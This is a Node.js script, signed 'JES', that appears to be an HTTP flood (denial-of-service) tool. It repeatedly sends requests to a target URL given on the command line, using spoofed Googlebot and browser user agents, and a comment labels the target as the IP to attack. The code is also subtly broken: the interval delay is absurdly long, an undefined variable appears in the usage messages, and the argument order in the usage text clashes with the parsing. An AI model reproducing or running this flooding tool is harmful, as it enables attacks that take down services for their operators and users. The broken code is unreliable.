//Made By JES                                                                                                                                               
// process.on('uncaughtException', function() {});                                                                                                             
// process.on('unhandledRejection', function() {});                                                                                                            

const querystring = require('querystring');
                                                                                                        
const url = require('url');                                                                                                                                 
var path = require("path");  
const execSync = require('child_process').execSync;   
try {                                                                                                                                                       
    var request = require('request');                                                                                                                         
} catch (err) {                                                                                                                                             
    console.log('\x1b[36mInstalling\x1b[37m the requirements');                                                                                             
    execSync('npm i -S request');                                                                                                                         
    console.log('Done.');                                                                                                                                   
    process.exit();                                                                                                                                         
}                                                                                         
                                                                                                                                               
var target = process.argv[2];  // 攻击的ip                                                                                                                             
var methods = process.argv[4]; // 请求方式
var parsed = url.parse(target);                                                                                                                             

setTimeout(() => {                                                                                                                                          
    process.exit(1);                                                                                                                                        
}, process.argv[3] * 1000);                                                                                                                                 


const UAs = [                                                                                                                                               
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36",                         
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",                                                                             
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",                                                                                                           
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",                                                                                              
    "Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",                                                                                                                                    
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",                                         
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",                    
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",                                                            
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",                                         
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",                                         
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",                                                                                 
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",                                         
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",                                         
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",                                         
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"                                     
];                                                                                                                                                          
setInterval(function() {    
    
  
    //定义请求消息头
    var headers = { 
        //'Content-type':'application/json;charset=UTF-8',
        'user-agent': UAs[Math.floor(Math.random() * UAs.length)],
       // 'Upgrade-Insecure-Requests:': 1,
        //"Accept-Encoding:" :  'gzip, deflate',
        //"Accept-Language:" : 'en-US,en;q=0.9',
        //"Cache-Control:" : "max-age=0",
       // "Connection:": "Keep-Alive"
    }; 
    var options = {
        url: target,
        method: methods,
        headers
    };

    //console.log(options)
                                                                                                                          
    request(options, function (error, response, body) {
    
    })
                                                                                                                                                                                                                                                 
}, 1000000000);                                                                                                                                                      



if (!process.argv[3]) {                                                                                                                                     
    console.log("\x1b[31m Error\x1b[37m: provide time duration");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration> <method>");
    process.exit();
}

if (!process.argv[4]) {                                                                                                                                     
    console.log("\x1b[31m Error\x1b[37m: please provide http method");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration> <method>");
    process.exit();
}

if (isNaN(process.argv[3])) {
    console.log("\x1b[31m Error\x1b[37m: enter valid time duration");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration> <method>");
    process.exit();
}

if (!process.argv[2] !== !process.argv[2].startsWith('http://') && !process.argv[2].startsWith('https://')) {
    console.log("\x1b[31m Error\x1b[37m: enter valid target");
    console.log("\x1b[36m usage\x1b[37m: node " + file + " <Target> <proxies> <duration> <method>");
    process.exit();
}

console.log("JESBBS".rainbow + "| JES");
console.log('\x1b[36mLoading\x1b[37m proxy list : %s', process.argv[3]);
console.log("\x1b[36mAttempting\x1b[37m to " + methods + " : %s || " + "\x1b[35m" + parsed.host + "\x1b[37m", process.argv[2]);